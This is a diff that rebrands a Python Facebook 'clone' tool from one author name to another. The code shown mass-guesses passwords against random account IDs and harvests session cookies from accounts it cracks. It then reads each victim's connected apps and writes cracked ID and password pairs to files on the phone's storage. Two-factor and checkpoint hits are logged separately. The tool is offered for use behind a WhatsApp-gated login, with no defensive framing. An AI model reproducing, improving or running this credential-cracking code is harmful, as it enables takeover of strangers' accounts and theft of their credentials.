@@ -1,4 +1,4 @@
-#created by Md. Rifat Uzzal Rear
+#created by Md. UZZAL Uzzal Rear
 #!/usr/bin/python3 
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
@@ -27,7 +27,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; RIFAT \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; UZZAL \x07')
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests
 import bs4
@@ -95,7 +95,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-rifat2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
+UZZAL2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
 import random
 cokbrut=[]
 ses=requests.Session()
@@ -267,7 +267,7 @@ twf = []
 
 
 
-def rifatT():
+def UZZALT():
     now = datetime.now()
     hours = now.hour
     if 4 <= hours < 12:timenow = "Good Morning"
@@ -294,26 +294,26 @@ logo = """
 \033[92;1m╭───────────────────────────────────────────────────────────╮
 \033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
 \033[92;1m●                                                           \033[92;1m● 
-\033[92;1m●\033[94;1m       db   db  .d8b.  .d8888.  .d8b.  d8b   db            \033[92;1m●       
-\033[92;1m●       88   88 d8' `8b 88'  YP d8' `8b 888o  88            \033[92;1m●       
-\033[92;1m●\033[93;1m       88ooo88 88ooo88 `8bo.   88ooo88 88V8o 88            \033[92;1m●      
-\033[92;1m●       88~~~88 88~~~88   `Y8b. 88~~~88 88 V8o88            \033[92;1m●      
-\033[92;1m●\033[93;1m       88   88 88   88 db   8D 88   88 88  V888            \033[92;1m●      
-\033[92;1m●\033[96;1m       YP   YP YP   YP `8888Y' YP   YP VP   V8P            \033[92;1m●
+\033[92;1m●\033[94;1m         __    __   ________   ________      ___       __            \033[92;1m●       
+\033[92;1m●       |  |  |  | |       /  |       /     /   \     |  |                   \033[92;1m●       
+\033[92;1m●\033[93;1m       |  |  |  | `---/  /   `---/  /     /  ^  \    |  |                   \033[92;1m●      
+\033[92;1m●       |  |  |  |    /  /       /  /     /  /_\  \   |  |             \033[92;1m●      
+\033[92;1m●\033[93;1m       |  `--'  |   /  /----.  /  /----./  _____  \  |  `----.             \033[92;1m●      
+\033[92;1m●\033[96;1m        \______/   /________| /________/__/     \__\ |_______|              \033[92;1m●
 \033[91;1m●                                                           \033[91;1m●      
 \033[91;1m●                                                           \033[91;1m● 
 \033[91;1m●                                                           \033[91;1m●   
-\033[92;1m●\033[94;1m   d888888b .d8888. db       .d8b.  .88b  d88.             \033[92;1m● 
-\033[92;1m●\033[94;1m     `u88'   88'  YP 88      d8' `8b 88'YbdP`88             \033[92;1m● 
-\033[92;1m●\033[93;1m      88    `8bo.   88      88ooo88 88  88  88             \033[92;1m● 
-\033[92;1m●\033[93;1m      88      `Y8b. 88      88~~~88 88  88  88             \033[92;1m● 
-\033[92;1m●\033[93;1m     .88.   db   8D 88booo. 88   88 88  88  88             \033[92;1m●  
-\033[92;1m●\033[96;1m   Y888888P `8888Y' Y88888P YP   YP YP  YP  YP             \033[92;1m● 
+\033[92;1m●\033[94;1m   ____    ____  ___      __    __.             \033[92;1m● 
+\033[92;1m●\033[94;1m     \   \  /   / /   \    |  |  |  |            \033[92;1m● 
+\033[92;1m●\033[93;1m       \   \/   / /  ^  \   |  |  |  |             \033[92;1m● 
+\033[92;1m●\033[93;1m        \      / /  /_\  \  |  |  |  |            \033[92;1m● 
+\033[92;1m●\033[93;1m      \    / /  _____  \ |  `--'  |             \033[92;1m●  
+\033[92;1m●\033[96;1m   \__/ /__/     \__\ \______/            \033[92;1m● 
 \033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
 \033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
 \033[92;1m╰───────────────────────────────────────────────────────────╯
 \033[92;1m╰───────────────────────────────────────────────────────────╯
-       \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m KING RIFAT }===========\033[1;37;40m\033[1;32m] \033[1;37;40m
+       \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m KING UZZAL }===========\033[1;37;40m\033[1;32m] \033[1;37;40m
        
 
 
@@ -350,16 +350,16 @@ import getpass
 attemps = 0
 print("")
 print("")
-print("\033[92;1mTools User: Uzzal Islam  ‌‌‌‌  ×[Copy and Paste]×")
+print("\033[92;1mTools User: Uzzal Vau  ‌‌‌‌  ×[Copy and Paste]×")
 print("")
 print("")
 print("\033[93;1mNote: \033[91;1mMessage the admin on WhatsApp to get the password")
 print("\033[95;1m")
 while attemps < 12345677901:
       username = input('ENTER USERNAME :')
-      os.system("xdg-open https://wa.me/+881843438888")
+      os.system("xdg-open https://wa.me/+8801843438888")
       password = input('ENTER PASSWORD :')
-      if username == 'Uzzal Islam' and password == 'Uzzal404':
+      if username == 'Uzzal Hossain' and password == 'Uzzal404':
          print('You Have Successfully Logged in.')
          break 
       else:
@@ -390,7 +390,7 @@ def cek_apk(session,coki):
         print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) rifat
+            #created by hbf team(owner) UZZAL
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -426,7 +426,7 @@ def XYZ():
     clear()
     print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
     print(f'{BLUE}══════════════════════════════════════════════════════')
-    print(f"\t      {WHITE}[{EXTRA} {rifatT()} {WHITE}]")
+    print(f"\t      {WHITE}[{EXTRA} {UZZALT()} {WHITE}]")
     print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
     print(f"{BLUE}══════════════════════════════════════════════════════")
     print(f"{RED}[01] {WHITE}BD RANDOM CLONE ")
@@ -434,16 +434,16 @@ def XYZ():
     print(f"{RED}[03] {WHITE}OWNER WHATSAPP")
     print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
     print(f"\033[1;91m=======================================================")
-    rifat = input("[√] CHOOSE : ")
-    if rifat in ["1","01"]:
+    UZZAL = input("[√] CHOOSE : ")
+    if UZZAL in ["1","01"]:
         passx()
-    elif rifat in ["2","02"]:
+    elif UZZAL in ["2","02"]:
         os.system("xdg-open https://www.facebook.com/profile.php?id=itzUzzalVau2008")
         XYZ()
-    elif rifat in ["3","03"]:
+    elif UZZAL in ["3","03"]:
         os.system("xdg-open https://wa.me/+8801843438888")
         XYZ()
-    elif rifat in ["0","00"]:
+    elif UZZAL in ["0","00"]:
        exit()
     else:
         print('\033[1;31mINCORECT OPTION !!');XYZ()
@@ -460,14 +460,14 @@ def passx():
     print(f"{RED}[02] {WHITE}AUTO PASS 7 AND 11 DIGITS  {GREEN}[FAST]")
     print(f"{RED}[03] {WHITE}AUTO ULTIMATE PASS         {GREEN}[NORMAL]")
     print(f"\033[1;91m=======================================================")
-    rifat = input("[√] CHOOSE : ")
-    if rifat in ["1","01"]:
+    UZZAL = input("[√] CHOOSE : ")
+    if UZZAL in ["1","01"]:
         pass1()
-    elif rifat in ["2","02"]:
+    elif UZZAL in ["2","02"]:
         pass2()
-    elif rifat in ["3","03"]:
+    elif UZZAL in ["3","03"]:
         Ulti()
-    elif rifat in ["4","04"]:
+    elif UZZAL in ["4","04"]:
         pass3()
     else:
         print('\033[1;31mINCORECT OPTION !!');XYZ()
@@ -515,7 +515,7 @@ def pass1():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/UZZAL-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -566,7 +566,7 @@ def pass2():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/UZZAL-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -613,7 +613,7 @@ def Ulti():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/UZZAL-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -662,7 +662,7 @@ def pass3():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/UZZAL-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -711,17 +711,17 @@ def freeq(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #os.system("play-audio RIFAT_OK.mp3")
+                #os.system("play-audio UZZAL_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                 cek_apk(session,coki)
-                open('/sdcard/RIFAT-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/UZZAL-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                    #os.system("play-audio RIFAT_2F.mp3")
+                    #os.system("play-audio UZZAL_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/Uzzal-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
@@ -737,7 +737,7 @@ def freeq(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[Uzzal] [%s] \33[1;97m[OK:%s{rifat2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[Uzzal] [%s] \33[1;97m[OK:%s{UZZAL2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
